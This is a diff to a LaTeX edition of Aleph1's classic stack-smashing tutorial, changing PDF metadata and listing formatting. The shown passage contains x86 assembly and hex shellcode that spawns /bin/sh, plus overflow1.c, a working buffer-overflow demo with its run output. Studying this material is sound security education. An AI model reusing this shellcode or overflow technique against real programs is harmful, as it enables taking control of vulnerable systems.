@@ -41,7 +41,7 @@
   pdfborder={0 0 0},% 链接无框
   pdftitle={stack smashing},
   pdfauthor={Aleph1},
-  pdfsubject={主题},
+  pdfsubject={stack smashing},
   pdfkeywords={stack},
   pdfcreator={应用程序},
   pdfproducer={PDF 制作程序},% 这个好像没起作用？
@@ -749,7 +749,8 @@ Lets compile it first, and then use gdb to obtain it.
 \begin{lstlisting}[caption=shellcodeasm.c]
 void main() 
 {
-__asm__("
+__asm__
+("
 jmp    0x2a                     # 3 bytes
 popl   %esi                     # 1 byte
 movl   %esi,0x8(%esi)           # 3 bytes
@@ -895,7 +896,7 @@ __asm__("
         call   -0x24              # 5 bytes
         .string \"/bin/sh\"       # 8 bytes
                                   # 46 bytes total
-");
+        ");
 }
 \end{lstlisting}
 
@@ -928,64 +929,51 @@ Lets try to pull all our pieces together. We have the shellcode. We know it must
 we'll use to overflow the buffer. We know we must point the return address back into the buffer. This example 
 will demonstrate these points:
 
-\begin{comment}
-overflow1.c 
+%overflow1.c 
+\begin{lstlisting}[caption=overflow1.c,basicstyle=\tiny]
 
 char shellcode[] =
-
-        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
-
-        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
-
-        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
 char large_string[128];
 
-void main() {
-
+void main() 
+{
   char buffer[96];
-
   int i;
-
   long *long_ptr = (long *) large_string;
 
   for (i = 0; i < 32; i++)
+    *(long_ptr + i) = (int) buffer;  
 
-    *(long_ptr + i) = (int) buffer;  for (i = 0; i < strlen(shellcode); i++)
-
+  for (i = 0; i < strlen(shellcode); i++)
     large_string[i] = shellcode[i];
 
   strcpy(buffer,large_string);
-
 }
+\end{lstlisting}
 
+\begin{verbatim}
 [aleph1]$ gcc -o exploit1 exploit1.c
-
 [aleph1]$ ./exploit1
-
 $ exit
-
 exit
-
 [aleph1]$
+\end{verbatim}
 
-What we have done above is filled the array large_string[] with the address of buffer[], which is where our code 
-
-will be. Then we copy our shellcode into the beginning of the large_string string. strcpy() will then copy 
-
-large_string onto buffer without doing any bounds checking, and wil l overflow the return address, overwriting it 
-
+What we have done above is filled the array \verb+large_string[]+ with the address of buffer[], which is where our code 
+will be. Then we copy our shellcode into the beginning of the \verb+large_string+ string. strcpy() will then copy 
+\verb+large_string+ onto buffer without doing any bounds checking, and wil l overflow the return address, overwriting it 
 with the address where our code  is now located.  Once we reach the end of main and it tr ied to return it jumps to 
-
 our code, and execs a shell. The problem we are faced when trying to overflow the buffer of another program is 
-
 trying to figure out at what address the buffer (and thus our code) will be. The answer is that for every program 
-
 the stack will start at the same addres s. Most programs do not push more than a few hundred or a few thousand 
-
 bytes into the stack at any one time. Therefore by knowing where  the stack starts we can try to guess where  the 
-
 buffer we are trying to overflow will be. Here is a little program that will print its stack pointer: 
+
+\begin{comment}
 
 sp.c
 
